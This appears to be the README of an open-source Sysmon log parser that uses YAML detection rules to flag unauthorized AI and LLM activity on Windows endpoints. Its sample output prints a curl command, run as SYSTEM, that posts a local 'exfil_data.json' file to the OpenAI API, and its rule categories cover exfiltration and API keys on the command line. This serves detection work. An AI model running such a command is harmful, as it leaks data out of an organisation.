# sysmon-parser

A Sysmon log parser that detects unauthorized AI and LLM activity on Windows endpoints.

## The Mission

Cybersecurity professionals at all career stages are new to AI tooling. As a community, we can lessen the learning curve by creating tools that lift each other up.

Imagine an intern who fires up AutoGPT with an internal API pasted into the command line. What about a compromised host that curls sensitive data to the OpenAI API under SYSTEM in the cloak of night?

Now imagine that we have the ability to prevent these mishaps and all of the damage that would follow. These events show up in Sysmon logs, but nobody wrote detection rules for them. Until now.

sysmon-parser reads Sysmon XML exports, extracts critical fields from Process Creation events (Event ID 1), and runs them through 35 purpose-built detection rules that flag AI/LLM threats across six categories.

## Detection Categories

| Category | What It Catches | Example Rules |
|---|---|---|
| **Local Inference** | Unauthorized LLM servers on endpoints | Ollama, llama.cpp, vLLM, KoboldCpp, LM Studio, GPT4All |
| **Model Downloads** | Model acquisition activity | HuggingFace pulls, GGUF/SafeTensors files, CivitAI |
| **GPU/Compute Abuse** | Unauthorized ML workloads | PyTorch, TensorFlow, CUDA toolkit, nvidia-smi |
| **AI Attack Tooling** | Offensive AI frameworks and credential exposure | AutoGPT, PentestGPT, API keys in CLI args, vendor API calls |
| **Exfiltration** | Data leaving through AI channels | curl to AI APIs, script engine spawns, SYSTEM-context AI tools |
| **Shadow AI** | Policy-violating AI usage | ChatGPT/Claude desktop apps, Stable Diffusion, Whisper |

Every detection includes a severity level (low, medium, high, critical) and a MITRE ATT&CK mapping.

## Quick Start

```bash
git clone https://github.com/jennshaggy/sysmon-parser.git
cd sysmon-parser
pip install pyyaml
```

Parse a Sysmon XML file:

```bash
python parser.py samples/event1.xml
```

Run with threat detection enabled:

```bash
python parser.py samples/event_exfil_ai.xml --detect
```

Only show events that triggered rules:

```bash
python parser.py samples/event_exfil_ai.xml --detect-only
```

## Usage

```
python parser.py <file.xml> [options]

Options:
  --detect              Run AI/LLM threat detection rules against events
  --detect-only         Only output events that trigger detection rules
  --image TEXT          Filter by process image (substring, case-insensitive)
  --user TEXT           Filter by user (exact match)
  --integrity-level     Filter by integrity level (High, Medium, Low, System)
```

All filters can be combined. Output is JSON to stdout.

## Sample Output

Given a Sysmon event where `curl.exe` runs as SYSTEM and POSTs data to the OpenAI API (spawned by `wscript.exe` from a VBS file in ProgramData):

```json
{
  "EventID": 1,
  "Computer": "FINANCE-PC03",
  "UtcTime": "2024-03-10 02:44:18.993",
  "Image": "C:\\Windows\\System32\\curl.exe",
  "CommandLine": "curl.exe -X POST https://api.openai.com/v1/chat/completions -H \"Authorization: Bearer sk-proj-abc123\" -d @C:\\Users\\Public\\exfil_data.json",
  "User": "NT AUTHORITY\\SYSTEM",
  "IntegrityLevel": "System",
  "ParentImage": "C:\\Windows\\System32\\wscript.exe",
  "detections": [
    {
      "rule_id": "AI-023",
      "name": "AI API Key in Command Line",
      "severity": "critical",
      "mitre": {"tactic": "Credential Access", "technique": "T1552.001"}
    },
    {
      "rule_id": "AI-026",
      "name": "AI Tool Spawned from Script Engine",
      "severity": "critical",
      "mitre": {"tactic": "Execution", "technique": "T1059.005"}
    },
    {
      "rule_id": "AI-028",
      "name": "AI Tool with SYSTEM Privileges",
      "severity": "critical",
      "mitre": {"tactic": "Privilege Escalation", "technique": "T1078"}
    },
    {
      "rule_id": "AI-029",
      "name": "Curl/Wget to AI API Endpoint",
      "severity": "high",
      "mitre": {"tactic": "Exfiltration", "technique": "T1048"}
    }
  ]
}
```

Five rules fire. Three are critical. The event tells a clear story: a scheduled VBS script running as SYSTEM is exfiltrating data through the OpenAI API using a leaked project key.

## Writing Your Own Rules

Detection rules live in `detections/` as YAML files. Drop in a new file and the engine picks it up automatically.

```yaml
rules:
  - id: CUSTOM-001
    name: Internal Model Server Detected
    description: Custom model serving endpoint running on workstation
    severity: high
    category: local_inference
    mitre:
      tactic: Execution
      technique: T1059.006
    match:
      commandline_contains:
        - my-internal-model-server
        - custom-inference-api
```

Match conditions (all must be true when combined):
- `image_contains` - substring match on process path
- `commandline_contains` - substring match on command line
- `parent_image_contains` - substring match on parent process path
- `integrity_level` - exact match on integrity level (High, Medium, Low, System)

## Fields Extracted

From every Sysmon Event ID 1 (Process Creation):

| Field | Source |
|---|---|
| EventID | System > EventID |
| Computer | System > Computer |
| UtcTime | EventData |
| Image | EventData |
| CommandLine | EventData |
| User | EventData |
| IntegrityLevel | EventData |
| ParentImage | EventData |
| ParentCommandLine | EventData |
| Hashes | EventData |

## Running Tests

```bash
python -m pytest tests/ -v
```

56 tests cover parsing, filtering, rule loading, detection matching across all categories, false positive validation, and end-to-end integration with sample Sysmon XML.

## Requirements

- Python 3.8+
- PyYAML

No other dependencies. The parser uses only the Python standard library for XML parsing, argument handling, and JSON output.

## Who This Is For

- **SOC analysts** triaging Sysmon alerts who want to catch AI-related threats their SIEM rules miss
- **Insider threat teams** monitoring for unauthorized model execution and data exfiltration through AI APIs
- **Compliance teams** enforcing organizational AI usage policies
- **Detection engineers** building AI-specific signatures for their environment

## License

MIT
